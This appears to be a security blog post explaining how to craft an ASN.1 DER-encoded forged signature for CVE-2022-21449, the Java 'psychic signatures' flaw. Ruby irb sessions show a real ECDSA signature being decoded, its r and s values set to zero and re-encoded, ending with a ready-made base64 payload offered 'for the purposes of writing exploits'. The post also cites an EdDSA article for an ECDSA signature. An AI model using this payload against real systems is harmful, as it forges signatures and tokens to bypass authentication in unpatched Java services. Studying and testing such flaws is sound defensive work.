---
title: Encoding Neil Madden's Psychic Signatures
description: CVE-2022-21449 ASN1 Encoding
date: 2022-06-21
social_image: '/media/images/somuchwin.png'
tags: [CVE-2022-21449, ASN1, encoding]
---
## Encoding Psychic Signatures

Neil Madden produced a fantastic blog on a cryptographic vulnerability he calls "psychic signatures":
 
https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/

In writing an example exploit, you can see the following note:

*Note that the "InP1363Format" qualifier just makes it easier to demonstrate the bug. Signatures in ASN.1 DER format can be exploited in the same way, you just have to do a bit more fiddling with the encoding first, but note that JWTs and other formats do use the raw IEEE P1363 format.*

It turns out that "fiddling with the encoding" process was quite annoying to figure out, so this blog describes how we did it. Below shows the Ruby shell. We're assuming that we're creating a signature on a SHA256 hash of a message, so let's follow the various guides in doing that.

```ruby

irb(main):037:0> digest = OpenSSL::Digest.new("sha256")
=> #<OpenSSL::Digest: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855>

irb(main):006:0> ecdsa_key = OpenSSL::PKey::EC.new 'prime256v1'
=> #<OpenSSL::PKey::EC:0x00007f33765a7f20 oid=id-ecPublicKey>
irb(main):007:0> ecdsa_key.generate_key
=> #<OpenSSL::PKey::EC:0x00007f33765a7f20 oid=id-ecPublicKey>
irb(main):040:0> digest = ecdsa_key.dsa_sign_asn1 digest.digest("test")
=> "0D\x02 ko)X3\xB9\x9E)F\xB9\x7F\xD0N\xDC\"?\xD2\xA5\x14\xB13\xA9\xB47\x7F\x05^\xF5\x9E\x97\xFBL\x02 ?\"\xD...
```

Assuming that our starting point is a legitimate "digest" representing the encoded signature we're working with, the following shows all the information encoded in that signature.

```ruby
irb(main):041:0> OpenSSL::ASN1.decode(digest)
=>
#<OpenSSL::ASN1::Sequence:0x00007f33814a7a98
 @indefinite_length=false,
 @tag=16,
 @tag_class=:UNIVERSAL,
 @tagging=nil,
 @value=
  [#<OpenSSL::ASN1::Integer:0x00007f33814a7c78
    @indefinite_length=false,
    @tag=2,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value=#<OpenSSL::BN 48593880172122714955079866597225943896445807881741726131324012493366128802636>>,
   #<OpenSSL::ASN1::Integer:0x00007f33814a7c00
    @indefinite_length=false,
    @tag=2,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value=#<OpenSSL::BN 28557301345307170716138283025282821810093596091474068235889136496461319008185>>]>
irb(main):042:0> asn1 = OpenSSL::ASN1.decode(digest)
=>
#<OpenSSL::ASN1::Sequence:0x00007f33814273e8
```
OK, so we have two Big Numbers held here. That's expected, it turns out a signature actually involves two numbers. Quoting from [the wikipedia article:](https://en.wikipedia.org/wiki/EdDSA) *An EdDSA signature on a message M by public key A is the pair (R,S).*

With this variable representing a correctly ASN1 encoded object, and the knowledge from Niel's write up our goal is two set both r and s to 0, we can do that.

```ruby
irb(main):044:0> asn1.value[0].value
=> #<OpenSSL::BN 48593880172122714955079866597225943896445807881741726131324012493366128802636>
irb(main):045:0> asn1.value[0].value = 0
=> 0
irb(main):046:0> asn1.value[1].value = 0
=> 0
irb(main):047:0> asn1
=>
#<OpenSSL::ASN1::Sequence:0x00007f33814273e8
 @indefinite_length=false,
 @tag=16,
 @tag_class=:UNIVERSAL,
 @tagging=nil,
 @value=
  [#<OpenSSL::ASN1::Integer:0x00007f3381427528
    @indefinite_length=false,
    @tag=2,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value=0>,
   #<OpenSSL::ASN1::Integer:0x00007f3381427410
    @indefinite_length=false,
    @tag=2,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value=0>]>

```

Finally, this shows us how to output this data as a binary DER file or BASE64 encoded DER.

```ruby
irb(main):052:0> asn1.to_der
=> "0\x06\x02\x01\x00\x02\x01\x00"
irb(main):053:0> require 'base64'
=> false
irb(main):058:0> Base64.urlsafe_encode64 asn1.to_der
=> "MAYCAQACAQA="

```

So for the purposes of writing exploits, the magic string to produce fake signatures is in fact `MAYCAQACAQA=`.